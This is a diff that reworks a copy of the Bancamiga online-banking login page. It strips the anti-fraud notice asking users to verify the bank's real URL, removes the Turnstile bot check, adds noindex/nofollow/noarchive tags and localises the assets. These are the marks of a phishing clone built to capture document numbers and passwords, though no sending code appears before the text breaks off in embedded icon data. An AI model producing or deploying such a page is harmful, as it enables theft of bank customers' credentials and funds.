@@ -4,19 +4,20 @@
 <title> Bancamiga
 </title>
 <meta name=description content>
-<meta name=author content="Luis Eduardo Perez">
 <meta name=viewport content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name=apple-mobile-web-app-title content=Bancamiga>
 <meta name=apple-mobile-web-app-status-bar-style content=black>
-<link rel=apple-touch-startup-image href=https://online.bancamiga.com/img/bg/FondoBancamiga.jpg>
+<link rel=apple-touch-startup-image href="assets/FondoBancamiga.jpg">
 <meta name=msapplication-TileColor content=#ffffff>
 <meta name=msapplication-TileImage content=/img/favicon/ms-icon-144x144.png>
 <meta name=theme-color content=#ffffff>
+<meta name="robots" content="noindex, nofollow, noarchive">
 <meta name=referrer content=no-referrer>
 <link rel="stylesheet" href="styles/style.css">
 <link rel="shortcut icon" href="assets/favicon.ico" type=image/x-icon>
 </head>
-<body class="smart-style-2 fixed-page-footer fixed-header desktop-detected" cz-shortcut-listen=true>
+
+<body class="smart-style-2 fixed-page-footer fixed-header desktop-detected">
+        
         <div id=main role=main class=mainRegister
                 style="background-image: url('assets/background.jpeg'); background-size: cover; background-position: center;">
                 <div id=content class=container style=opacity:1>
@@ -24,26 +25,13 @@
                                 <div class=modal-content>
                                         <div class=modal-header>
                                                 <h4 class="modal-title text-center">
-                                                        <img src="assets/logo.svg" alt=Bancamiga style=width:85%>
+                                                        <img src="assets/logo.svg" style=width:85%>
                                                 </h4>
                                         </div>
-                                        <form id=login-form novalidate>
-                                                <div class=cf-turnstile data-sitekey=0x4AAAAAAANeHPgF86kpmr3i
-                                                        data-callback=turnstileLoaded
-                                                        data-error-callback=turnstileLoaded></div>
-                                                <input type=text id=hdp
-                                                        value=$2y$12$52Oh.es1akv0BBXlqT5OnufFKNGMoMwl/qY/4xCI3bJUwF6CccGXu
-                                                        hidden class=sf-hidden>
-                                                <div class="modal-body smart-form client-form">
-                                                        <div class="alert alert-warning fade in">
-                                                                <i class="fa-fw fa fa-info"></i>
-                                                                <strong>Protégete del fraude</strong>
-                                                                <br>
-                                                                Recuerda verificar que el URL <i
-                                                                        class="fa fa-arrow-circle-up"></i> sea el
-                                                                correcto
-                                                                <strong>https://online.bancamiga.com/?p=1</strong>
-                                                        </div>
+                                        <div>
+
+                                                <div class="modal-body smart-ctx">
+
                                                         <fieldset>
                                                                 <div class=row>
                                                                         <section class="col col-4">
@@ -87,11 +75,11 @@
                                                                                         <i
                                                                                                 class="fa fa-user icon-append"></i>
                                                                                         <input type=text
-                                                                                                class="form-control numbersOnly loginpass"
+                                                                                                class="numbersOnly"
                                                                                                 maxlength=10
                                                                                                 name=documento
                                                                                                 id=documento
-                                                                                                autocomplete=off value>
+                                                                                                autocomplete=off>
                                                                                         <b
                                                                                                 class="tooltip tooltip-top-right">
                                                                                                 <i
@@ -125,15 +113,14 @@
                                                                                         Ingrese su contraseña
                                                                                 </label>
                                                                                 <div class=input>
-                                                                                        <i class="fa fa-eye-slash icon-append move_me input-token"
+                                                                                        <i class="fa fa-eye-slash icon-append move_me"
                                                                                                 style=color:rgb(50,118,177);font-weight:bold;font-size:10px;cursor:pointer></i>
-                                                                                        <input type=text
-                                                                                                class="loginpass lgpass input-token"
+                                                                                        <input type=password
                                                                                                 name=p id=p minlength=8
                                                                                                 maxlength=16
                                                                                                 autocomplete=off value>
                                                                                         <b
-                                                                                                class="tooltip tooltip-top-right input-token"><i
+                                                                                                class="tooltip tooltip-top-right"><i
                                                                                                         class="fa fa-lock txt-color-teal"></i>
                                                                                                 Clic aqui para
                                                                                                 visualizar clave</b>
@@ -144,15 +131,12 @@
                                                 </div>
                                                 <div class="modal-footer text-center">
                                                         <fieldset style="padding:0 14px 5px">
-                                                                <div class="cargando text-center hide sf-hidden">
-                                                                        Cargando, Por favor espere un momento...
-                                                                </div>
                                                                 <div class=botones>
                                                                         <div class=row>
                                                                                 <div class=col-xs-6>
                                                                                         <button type=button
                                                                                                 class="btn btn-warning btn-block margin-top-5"
-                                                                                                id=cmdRegister disabled
+                                                                                                id="cmdRg" disabled
                                                                                                 style=cursor:not-allowed>
                                                                                                 <i
                                                                                                         class="fa fa-user"></i>
@@ -162,7 +146,7 @@
                                                                                 <div class=col-xs-6>
                                                                                         <button type=button
                                                                                                 class="btn btn-success btn-block margin-top-5"
-                                                                                                id=cmdLogin
+                                                                                                id="cmdLg"
                                                                                                 style="border:1px solid rgb(132,168,62);cursor:not-allowed"
                                                                                                 disabled>
                                                                                                 <i
@@ -208,27 +192,27 @@
                                                                         style=display:flex;justify-content:center>
                                                                         <a href="">
                                                                                 <img class=redes-login
-                                                                                        src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNTBweCIgaGVpZ2h0PSI0OXB4IiB2aWV3Qm94PSIwIDAgNTAgNDkiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+Q0I0M0NFNzItQkFEMC00MkRBLUIwQzQtNzBFMUMxMTQ1NEY2PC90aXRsZT4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJMT0dJTi1CQU5DQU1JR0EiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xMjQwLjAwMDAwMCwgLTgyMC4wMDAwMDApIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iRkFDRUJPT0siIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEyNDAuMDAwMDAwLCA4MjAuMDAwMDAwKSI+CiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNNTAsMjQuNSBDNDkuNDQ0MzA0MSw1Ny4xNjY2NjY3IDAuNTU1Njk1ODgzLDU3LjE2NjY2NjcgMCwyNC41IEMwLjU1NTY5NTg4MywtOC4xNjY2NjY2NyA0OS40NDQzMDQxLC04LjE2NjY2NjY3IDUwLDI0LjUgWiIgaWQ9IlBhdGgiIGZpbGw9IiNGRkZGRkYiPjwvcGF0aD4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0zMi4wMjE0NDc3LDI3LjE4NjY5MjIgTDMyLjc5ODkyNzYsMjIuMzAxMTAxIEwyNy45MzI5NzU5LDIyLjMwMTEwMSBMMjcuOTMyOTc1OSwxOS4xMzQ1MTQxIEMyNy45MzI5NzU5LDE3LjgwMzI1NTEgMjguNjE2NjIyLDE2LjQ5Nzg0NTkgMzAuNzg4MjAzOCwxNi40OTc4NDU5IEwzMywxNi40OTc4NDU5IEwzMywxMi4zMzYwNDYgQzMzLDEyLjMzNjA0NiAzMC45ODkyNzYxLDEyIDI5LjA3MjM4NjEsMTIgQzI1LjA2NDM0MzIsMTIgMjIuNDUwNDAyMSwxNC4zMzkzOTY4IDIyLjQ1MDQwMjEsMTguNTc4NzQ1OCBMMjIuNDUwNDAyMSwyMi4zMDExMDEgTDE4LDIyLjMwMTEwMSBMMTgsMjcuMTg2NjkyMiBMMjIuNDUwNDAyMSwyNy4xODY2OTIyIEwyMi40NTA0MDIxLDM5IEwyNy45MzI5NzU5LDM5IEwyNy45MzI5NzU5LDI3LjE4NjY5MjIgTDMyLjAyMTQ0NzcsMjcuMTg2NjkyMiBMMzIuMDIxNDQ3NywyNy4xODY2OTIyIFoiIGlkPSJQYXRoIiBmaWxsPSIjMDQ4MUY5Ij48L3BhdGg+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg=="
+                                                                                        src="assets/fb.svg"
                                                                                         alt=Facebook>
                                                                         </a>
                                                                         <a href="">
                                                                                 <img class=redes-login
-                                                                                        src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNTBweCIgaGVpZ2h0PSI0OXB4IiB2aWV3Qm94PSIwIDAgNTAgNDkiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+MjUzQkI2REItODZBNi00ODQyLTkzNTktQTBFNUQ2NEVFMzJDPC90aXRsZT4KICAgIDxkZWZzPgogICAgICAgIDxsaW5lYXJHcmFkaWVudCB4MT0iLTM0MC4yNDM5MDIlIiB5MT0iLTMyMy41NzcyMzYlIiB4Mj0iNDMyLjUyMDMyNSUiIHkyPSI0MTYuMjYwMTYzJSIgaWQ9ImxpbmVhckdyYWRpZW50LTEiPgogICAgICAgICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjRkRFMTkxIiBvZmZzZXQ9IjAlIj48L3N0b3A+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiNGRkJFNTUiIG9mZnNldD0iMjElIj48L3N0b3A+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiNGRjYyNzkiIG9mZnNldD0iMzglIj48L3N0b3A+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiNFMDQ5OTMiIG9mZnNldD0iNTIlIj48L3N0b3A+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiM5NTQ0Q0IiIG9mZnNldD0iNzQlIj48L3N0b3A+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiM1QTU1RTQiIG9mZnNldD0iMTAwJSI+PC9zdG9wPgogICAgICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgICAgICAgPGxpbmVhckdyYWRpZW50IHgxPSItNDIuMTUxMTYyOCUiIHkxPSItMzguMTc4Mjk0NiUiIHgyPSIxNDIuMDU0MjY0JSIgeTI9IjEzOC4xNzgyOTUlIiBpZD0ibGluZWFyR3JhZGllbnQtMiI+CiAgICAgICAgICAgIDxzdG9wIHN0b3AtY29sb3I9IiNGREUxOTEiIG9mZnNldD0iMCUiPjwvc3RvcD4KICAgICAgICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iI0ZGQkU1NSIgb2Zmc2V0PSIyMSUiPjwvc3RvcD4KICAgICAgICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iI0ZGNjI3OSIgb2Zmc2V0PSIzOCUiPjwvc3RvcD4KICAgICAgICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iI0UwNDk5MyIgb2Zmc2V0PSI1MiUiPjwvc3RvcD4KICAgICAgICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iIzk1NDRDQiIgb2Zmc2V0PSI3NCUiPjwvc3RvcD4KICAgICAgICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iIzVBNTVFNCIgb2Zmc2V0PSIxMDAlIj48L3N0b3A+CiAgICAgICAgPC9saW5lYXJHcmFkaWVudD4KICAgICAgICA8bGluZWFyR3JhZGllbnQgeDE9IjQuOTExNzc4NzMlIiB5MT0iNi44NjY5NTI3OSUiIHgyPSI5NS41NjUwOTMlIiB5Mj0iOTMuNjA5OTE4OSUiIGlkPSJsaW5lYXJHcmFkaWVudC0zIj4KICAgICAgICAgICAgPHN0b3Agc3RvcC1jb2xvcj0iI0ZERTE5MSIgb2Zmc2V0PSIwJSI+PC9zdG9wPgogICAgICAgICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjRkZCRTU1IiBvZmZzZXQ9IjIxJSI+PC9zdG9wPgogICAgICAgICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjRkY2Mjc5IiBvZmZzZXQ9IjM4JSI+PC9zdG9wPgogICAgICAgICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjRTA0OTkzIiBvZmZzZXQ9IjUyJSI+PC9zdG9wPgogICAgICAgICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjOTU0NENCIiBvZmZzZXQ9Ijc0JSI+PC9zdG9wPgogICAgICAgICAgICA8c3RvcCBzdG9wLWNvbG9yPSIjNUE1NUU0IiBvZmZzZXQ9IjEwMCUiPjwvc3RvcD4KICAgICAgICA8L2xpbmVhckdyYWRpZW50PgogICAgPC9kZWZzPgogICAgPGcgaWQ9IlBhZ2UtMSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPGcgaWQ9IkxPR0lOLUJBTkNBTUlHQSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTEzMTUuMDAwMDAwLCAtODIwLjAwMDAwMCkiIGZpbGwtcnVsZT0ibm9uemVybyI+CiAgICAgICAgICAgIDxnIGlkPSJJTlNUQUdSQU0iIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEzMTUuMDAwMDAwLCA4MjAuMDAwMDAwKSI+CiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNNTAsMjQuNSBDNDkuNDMzODE5OCw1Ny4xNjY2NjY3IDAuNTUzNTk4MzksNTcuMTY2NjY2NyAwLDI0LjUgQzAuNTY2MTgwMTcxLC04LjE2NjY2NjY3IDQ5LjQ0NjQwMTYsLTguMTY2NjY2NjcgNTAsMjQuNSBaIiBpZD0iUGF0aCIgZmlsbD0iI0ZGRkZGRiI+PC9wYXRoPgogICAgICAgICAgICAgICAgPGcgaWQ9Ikdyb3VwIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMi4wMDAwMDAsIDExLjAwMDAwMCkiPgogICAgICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMC42NTIzNjA1LDQuODI4MzI2MTggQzE5Ljc3NjgyNCw0LjgyODMyNjE4IDE5LjA2ODY2OTUsNS41MzY0ODA2OSAxOS4wNjg2Njk1LDYuNDEyMDE3MTcgQzE5LjA2ODY2OTUsNy4yODc1NTM2NSAxOS43NzY4MjQsNy45OTU3MDgxNSAyMC42NTIzNjA1LDcuOTk1NzA4MTUgQzIxLjUyNzg5Nyw3Ljk5NTcwODE1IDIyLjIzNjA1MTUsNy4yODc1NTM2NSAyMi4yMzYwNTE1LDYuNDEyMDE3MTcgQzIyLjIzNjA1MTUsNS41MzY0ODA2OSAyMS41Mjc4OTcsNC44MjgzMjYxOCAyMC42NTIzNjA1LDQuODI4MzI2MTggWiIgaWQ9IlBhdGgiIGZpbGw9InVybCgjbGluZWFyR3JhZGllbnQtMSkiPjwvcGF0aD4KICAgICAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMTMuNjIyMzE3Niw2Ljg2MjY2MDk0IEM5Ljk1Mjc4OTcsNi44NjI2NjA5NCA2Ljk3ODU0MDc3LDkuODQ5Nzg1NDEgNi45Nzg1NDA3NywxMy41MDY0Mzc4IEM2Ljk3ODU0MDc3LDE3LjE2MzA5MDEgOS45NjU2NjUyNCwyMC4xNTAyMTQ2IDEzLjYyMjMxNzYsMjAuMTUwMjE0NiBDMTcuMjc4OTcsMjAuMTUwMjE0NiAyMC4yNjYwOTQ0LDE3LjE2MzA5MDEgMjAuMjY2MDk0NCwxMy41MDY0Mzc4IEMyMC4yNjYwOTQ0LDkuODQ5Nzg1NDEgMTcuMjc4OTcsNi44NjI2NjA5NCAxMy42MjIzMTc2LDYuODYyNjYwOTQgWiBNMTMuNjIyMzE3NiwxNy43NjgyNDAzIEMxMS4yNzg5NywxNy43NjgyNDAzIDkuMzYwNTE1MDIsMTUuODYyNjYwOSA5LjM2MDUxNTAyLDEzLjUwNjQzNzggQzkuMzYwNTE1MDIsMTEuMTUwMjE0NiAxMS4yNjYwOTQ0LDkuMjQ0NjM1MTkgMTMuNjIyMzE3Niw5LjI0NDYzNTE5IEMxNS45Nzg1NDA4LDkuMjQ0NjM1MTkgMTcuODg0MTIwMiwxMS4xNTAyMTQ2IDE3Ljg4NDEyMDIsMTMuNTA2NDM3OCBDMTcuODg0MTIwMiwxNS44NjI2NjA5IDE1Ljk3ODU0MDgsMTcuNzY4MjQwMyAxMy42MjIzMTc2LDE3Ljc2ODI0MDMgWiIgaWQ9IlNoYXBlIiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50LTIpIj48L3BhdGg+CiAgICAgICAgICAgICAgICAgICAgPHBhdGggZD0iTTE4Ljg4ODQxMiwyNyBMOC4xMTE1ODc5OCwyNyBDMy42NDM3NzY4MiwyNyAwLDIzLjM2OTA5ODcgMCwxOC44ODg0MTIgTDAsOC4xMTE1ODc5OCBDMCwzLjY0Mzc3NjgyIDMuNjMwOTAxMjksMCA4LjExMTU4Nzk4LDAgTDE4Ljg4ODQxMiwwIEMyMy4zNTYyMjMyLDAgMjcsMy42MzA5MDEyOSAyNyw4LjExMTU4Nzk4IEwyNywxOC44ODg0MTIgQzI3LDIzLjM1NjIyMzIgMjMuMzY5MDk4NywyNyAxOC44ODg0MTIsMjcgWiBNOC4xMjQ0NjM1MiwyLjU0OTM1NjIyIEM1LjA2MDA4NTg0LDIuNTQ5MzU2MjIgMi41NjIyMzE3Niw1LjA0NzIxMDMgMi41NjIyMzE3Niw4LjExMTU4Nzk4IEwyLjU2MjIzMTc2LDE4Ljg4ODQxMiBDMi41NjIyMzE3NiwyMS45NTI3ODk3IDUuMDYwMDg1ODQsMjQuNDUwNjQzOCA4LjEyNDQ2MzUyLDI0LjQ1MDY0MzggTDE4LjkwMTI4NzYsMjQuNDUwNjQzOCBDMjEuOTY1NjY1MiwyNC40NTA2NDM4IDI0LjQ2MzUxOTMsMjEuOTUyNzg5NyAyNC40NjM1MTkzLDE4Ljg4ODQxMiBMMjQuNDYzNTE5Myw4LjExMTU4Nzk4IEMyNC40NjM1MTkzLDUuMDQ3MjEwMyAyMS45NjU2NjUyLDIuNTQ5MzU2MjIgMTguOTAxMjg3NiwyLjU0OTM1NjIyIEw4LjEyNDQ2MzUyLDIuNTQ5MzU2MjIgWiIgaWQ9IlNoYXBlIiBmaWxsPSJ1cmwoI2xpbmVhckdyYWRpZW50LTMpIj48L3BhdGg+CiAgICAgICAgICAgICAgICA8L2c+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg=="
+                                                                                        src="assets/insta.svg"
                                                                                         alt=Instagram>
                                                                         </a>
                                                                         <a href="">
                                                                                 <img class=redes-login
-                                                                                        src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNTBweCIgaGVpZ2h0PSI0OXB4IiB2aWV3Qm94PSIwIDAgNTAgNDkiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+NUZBRkEwOEQtQjZBOS00NzVBLUE1RUMtQUY3MjNFMUVCOTIwPC90aXRsZT4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJMT0dJTi1CQU5DQU1JR0EiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xMzkwLjAwMDAwMCwgLTgyMC4wMDAwMDApIiBmaWxsLXJ1bGU9Im5vbnplcm8iPgogICAgICAgICAgICA8ZyBpZD0iVFdJVFRFUiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTM5MC4wMDAwMDAsIDgyMC4wMDAwMDApIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik01MCwyNC41IEM0OS40MzM4MTk4LDU3LjE2NjY2NjcgMC41NTM1OTgzOSw1Ny4xNjY2NjY3IDAsMjQuNSBDMC41NjYxODAxNzEsLTguMTY2NjY2NjcgNDkuNDQ2NDAxNiwtOC4xNjY2NjY2NyA1MCwyNC41IFoiIGlkPSJQYXRoIiBmaWxsPSIjRkZGRkZGIj48L3BhdGg+CiAgICAgICAgICAgICAgICA8cGF0aCBkPSJNMzcuODg1OTcxNSwxNi42NTk1NzA1IEMzNy4wMjQ0MjMxLDE3LjA0ODgyODMgMzYuMDc0MTg1OCwxNy4yNzQ4NDkgMzUuMTQ5Mjg4MiwxNy40MjU1Mjk1IEMzNS41OTI3MzIyLDE3LjM1MDE4OTIgMzYuMjM4ODkzNiwxNi41NTkxMTY4IDM2LjQ5MjI5MDIsMTYuMjQ1MTk5MiBDMzYuODg1MDU0OSwxNS43NTU0ODc3IDM3LjIxNDQ3MDUsMTUuMjAyOTkyNyAzNy40MDQ1MTgsMTQuNjEyODI3NSBDMzcuNDI5ODU3NiwxNC41NjI2MDA3IDM3LjQ0MjUyNzUsMTQuNTEyMzczOSAzNy40MDQ1MTgsMTQuNDc0NzAzOCBDMzcuMzQxMTY4OCwxNC40NDk1OTA0IDM3LjMwMzE1OTMsMTQuNDc0NzAzOCAzNy4yNjUxNDk4LDE0LjQ3NDcwMzggQzM2LjIyNjIyMzgsMTUuMDI3MTk4OCAzNS4xNjE5NTgsMTUuNDE2NDU2NyAzNC4wMjE2NzMzLDE1LjcwNTI2MDkgQzMzLjkzMjk4NDUsMTUuNzMwMzc0MyAzMy44NTY5NjU1LDE1LjcwNTI2MDkgMzMuNzkzNjE2MywxNS42NDI0Nzc0IEMzMy43MDQ5Mjc1LDE1LjU0MjAyMzcgMzMuNjE2MjM4NywxNS40NDE1NzAxIDMzLjUxNDg4MDEsMTUuMzUzNjczMSBDMzMuMDMzNDI2NSwxNC45NTE4NTg2IDMyLjUyNjYzMzMsMTQuNjM3OTQxIDMxLjk0MzgyMTEsMTQuMzk5MzYzNiBDMzEuMTgzNjMxMywxNC4wOTgwMDI2IDMwLjM2MDA5MjMsMTMuOTU5ODc4OSAyOS41MzY1NTMzLDE0LjAxMDEwNTcgQzI4LjczODM1NCwxNC4wNjAzMzI1IDI3Ljk2NTQ5NDQsMTQuMjg2MzUzMiAyNy4yNTU5ODM5LDE0LjY1MDQ5NzcgQzI2LjU0NjQ3MzQsMTUuMDE0NjQyMSAyNS45MTI5ODE5LDE1LjUyOTQ2NyAyNS40MTg4NTg1LDE2LjE0NDc0NTYgQzI0Ljg5OTM5NTQsMTYuNzg1MTM3NSAyNC41MTkzMDA1LDE3LjUyNTk4MzEgMjQuMzE2NTgzMiwxOC4zMjk2MTIyIEMyNC4xMjY1MzU4LDE5LjA5NTU3MTIgMjQuMTM5MjA1NiwxOS44NjE1MzAyIDI0LjI1MzIzNDEsMjAuNjQwMDQ2IEMyNC4yNjU5MDM5LDIwLjc2NTYxMyAyNC4yNTMyMzQxLDIwLjc5MDcyNjQgMjQuMTM5MjA1NiwyMC43NjU2MTMgQzE5LjY5MjA5NTIsMjAuMTEyNjY0MyAxNi4wMDUxNzQ1LDE4LjUzMDUxOTUgMTMuMDE1MDk0NiwxNS4xNTI3NjU5IEMxMi44ODgzOTYzLDE1LjAwMjA4NTQgMTIuODEyMzc3MywxNS4wMDIwODU0IDEyLjcxMTAxODYsMTUuMTUyNzY1OSBDMTEuNDA2MDI2MSwxNy4wOTkwNTUxIDEyLjAzOTUxNzYsMjAuMjI1Njc0NyAxMy42NzM5MjU3LDIxLjc1NzU5MjcgQzEzLjg4OTMxMjksMjEuOTU4NSAxNC4xMTczNjk4LDIyLjE3MTk2NCAxNC4zNTgwOTY2LDIyLjM0Nzc1NzggQzE0LjI2OTQwNzgsMjIuMzYwMzE0NSAxMy4xNzk4MDI0LDIyLjI0NzMwNDIgMTIuMjA0MjI1NCwyMS43NTc1OTI3IEMxMi4wNzc1MjcxLDIxLjY4MjI1MjUgMTIuMDE0MTc4LDIxLjcxOTkyMjYgMTIuMDAxNTA4MSwyMS44NzA2MDMgQzEyLjAwMTUwODEsMjIuMDg0MDY3IDEyLjAwMTUwODEsMjIuMjcyNDE3NiAxMi4wMzk1MTc2LDIyLjQ5ODQzODMgQzEyLjI5MjkxNDIsMjQuNDY5ODQxIDEzLjY3MzkyNTcsMjYuMjkwNTYzMiAxNS41NjE3MzA1LDI3LjAwNjI5NTQgQzE1Ljc4OTc4NzQsMjcuMDk0MTkyMyAxNi4wMzA1MTQyLDI3LjE4MjA4OTMgMTYuMjcxMjQxLDI3LjIxOTc1OTQgQzE1Ljg0MDQ2NjcsMjcuMzA3NjU2MyAxNS4zOTcwMjI3LDI3LjM4Mjk5NjYgMTQuMTY4MDQ5MSwyNy4yODI1NDI5IEMxNC4wMTYwMTEyLDI3LjI1NzQyOTUgMTMuOTUyNjYyLDI3LjMzMjc2OTcgMTQuMDE2MDExMiwyNy40NzA4OTM1IEMxNC45NDA5MDg4LDI5Ljk2OTY3NzggMTYuOTQyNzQyLDMwLjcyMzA4MDEgMTguNDM3NzgyLDMxLjEzNzQ1MTQgQzE4LjY0MDQ5OTIsMzEuMTc1MTIxNSAxOC44NDMyMTY1LDMxLjE3NTEyMTUgMTkuMDQ1OTMzOCwzMS4yMTI3OTE2IEMxOS4wNDU5MzM4LDMxLjIyNTM0ODMgMTkuMDIwNTk0MiwzMS4yMjUzNDgzIDE5LjAwNzkyNDMsMzEuMjUwNDYxNyBDMTguNTEzODAwOSwzMi4wMDM4NjQgMTYuNzkwNzA0LDMyLjU1NjM1OSAxNS45Nzk4MzQ5LDMyLjgzMjYwNjUgQzE0LjUyMjgwNDQsMzMuMzM0ODc0NyAxMi45MjY0MDU4LDMzLjU2MDg5NTQgMTEuMzkzMzU2MywzMy40MTAyMTUgQzExLjE1MjYyOTUsMzMuMzcyNTQ0OSAxMS4wODkyODA0LDMzLjM3MjU0NDkgMTEuMDI1OTMxMiwzMy40MTAyMTUgQzEwLjk2MjU4MjEsMzMuNDQ3ODg1MSAxMS4wMjU5MzEyLDMzLjUxMDY2ODYgMTEuMTAxOTUwMiwzMy41NzM0NTIxIEMxMS40MTg2OTU5LDMzLjc3NDM1OTQgMTEuNzM1NDQxNywzMy45NjI3MSAxMi4wNTIxODc1LDM0LjEzODUwMzkgQzEzLjAyNzc2NDQsMzQuNjUzMzI4OCAxNC4wNTQwMjA3LDM1LjA2NzcgMTUuMTE4Mjg2NCwzNS4zNTY1MDQyIEMyMC42Mjk2NjI2LDM2Ljg2MzMwODggMjYuODM3ODc5NSwzNS43NTgzMTg4IDMwLjk4MDkxNCwzMS42NzczODk3IEMzNC4yMzcwNjA0LDI4LjQ3NTQyOTkgMzUuMzc3MzQ1MSwyNC4wNTU0Njk3IDM1LjM3NzM0NTEsMTkuNjM1NTA5NiBDMzUuMzc3MzQ1MSwxOS40NTk3MTU3IDM1LjU4MDA2MjQsMTkuMzcxODE4NyAzNS43MDY3NjA3LDE5LjI3MTM2NTEgQzM2LjU1NTYzOTMsMTguNjQzNTI5OSAzNy4yMzk4MTAyLDE3Ljg5MDEyNzYgMzcuODYwNjMxOSwxNy4wNDg4MjgzIEMzOCwxNi44NjA0Nzc3IDM4LDE2LjY5NzI0MDYgMzgsMTYuNjIxOTAwMyBMMzgsMTYuNTk2Nzg2OSBDMzgsMTYuNTIxNDQ2NyAzOCwxNi41NDY1NjAxIDM3Ljg4NTk3MTUsMTYuNTk2Nzg2OSBMMzcuODg1OTcxNSwxNi42NTk1NzA1IFoiIGlkPSJQYXRoIiBmaWxsPSIjMDBDOUZBIj48L3BhdGg+CiAgICAgICAgICAgIDwvZz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg=="
+                                                                                        src="assets/twitter.svg"
                                                                                         alt=Twitter>
                                                                         </a>
                                                                         <a href="">
                                                                                 <img class=redes-login
-                                                                                        src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNTBweCIgaGVpZ2h0PSI0OXB4IiB2aWV3Qm94PSIwIDAgNTAgNDkiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8dGl0bGU+QTVENEVGRjgtMTA4Mi00OTlELUFGNjMtOUJEMTk5MjBDQkNBPC90aXRsZT4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJMT0dJTi1CQU5DQU1JR0EiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xNDY0LjAwMDAwMCwgLTgyMC4wMDAwMDApIj4KICAgICAgICAgICAgPGcgaWQ9IlRJS1RPSyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTQ2NC4wMDAwMDAsIDgyMC4wMDAwMDApIj4KICAgICAgICAgICAgICAgIDxwYXRoIGQ9Ik01MCwyNC41IEM0OS40MzM4MTk4LDU3LjE2NjY2NjcgMC41NTM1OTgzOSw1Ny4xNjY2NjY3IDAsMjQuNSBDMC41NjYxODAxNzEsLTguMTY2NjY2NjcgNDkuNDQ2NDAxNiwtOC4xNjY2NjY2NyA1MCwyNC41IFoiIGlkPSJQYXRoIiBmaWxsPSIjRkZGRkZGIiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4KICAgICAgICAgICAgICAgIDxnIGlkPSJHcm91cCIgdHJhbnNmb3JtPS